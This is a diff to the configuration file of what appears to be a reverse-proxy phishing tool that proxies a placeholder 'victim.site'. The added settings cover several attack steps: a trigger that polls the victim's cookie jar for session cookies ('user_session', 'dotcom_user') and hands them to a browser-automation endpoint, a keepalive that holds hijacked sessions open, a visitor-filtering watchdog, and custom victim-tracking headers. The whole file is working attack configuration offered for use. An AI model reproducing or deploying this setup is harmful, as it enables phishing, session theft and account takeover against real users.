@@ -5,8 +5,13 @@
     # Target domain to proxy
     destination = "victim.site"
 
-    # Listening IP address
-    IP = "0.0.0.0"
+    # Listening IP address (IPv4 or IPv6)
+	# e.g. 0.0.0.0 or [::]
+    IP = "127.0.0.1"
+
+	# Listen announces on the local network address.
+	# The network must be "tcp", "tcp4", "tcp6"
+	listener = "tcp4"
 
     # Listeninng TCP Port
     port = 443
@@ -93,7 +98,7 @@
     redirectTo = "https://victim.site"
 
 [[drop]]
-    path = "/singout"
+    path = "/signout"
     redirectTo = "https://victim.site"
 
 
@@ -139,6 +144,17 @@
     endpoint = "http://necrobrowser.url/xyz"
     profile = "./config/instrument.necro"
 
+    [necrobrowser.keepalive]
+        # GET on an authenticated endpoint to keep the session alive
+        # every keepalive request is processed as its own necrotask
+        enabled = false
+        minutes = 5    # keeps alive the session every 5 minutes
+
+
+    [necrobrowser.trigger]
+        type = "cookies"
+        values = ["user_session", "dotcom_user"]  # values can be cookies names or relative paths
+        delay = 5   # check every 5 seconds victim's cookie jar to see if we need to instrument something
 
 #
 # STATIC SERVER
@@ -151,10 +167,20 @@
 
 
 #
+# WATCHDOG
+#
+[watchdog]
+	enabled = true
+	# Monitor rules file changes and reload
+	dynamic = true
+	rules = "./config/watchdog.rules"
+	geoDb = "./config/geodb.mmdb"
+
+#
 # TRACKING
 #
 [tracking]
-enabled = true
+enabled = false
 
     # Tracking types can be Path || Query (default)
     #
@@ -171,6 +197,12 @@ enabled = true
 
     # Rule to generate and validate a tracking identifier
     regex = "[a-zA-Z0-9]{5}"
+
+	# Tracking initial HTTP Header (empty is: If-Range)
+	header = "X-Whatveryouwant-Header"
+
+	# Landing HTTP Header (empty is: X-If-Landing-Redirect)
+	landing = "X-Whatveryouwant-Landing-Header"
 
     # Set speific victim's IP address
     # ipSource = ""
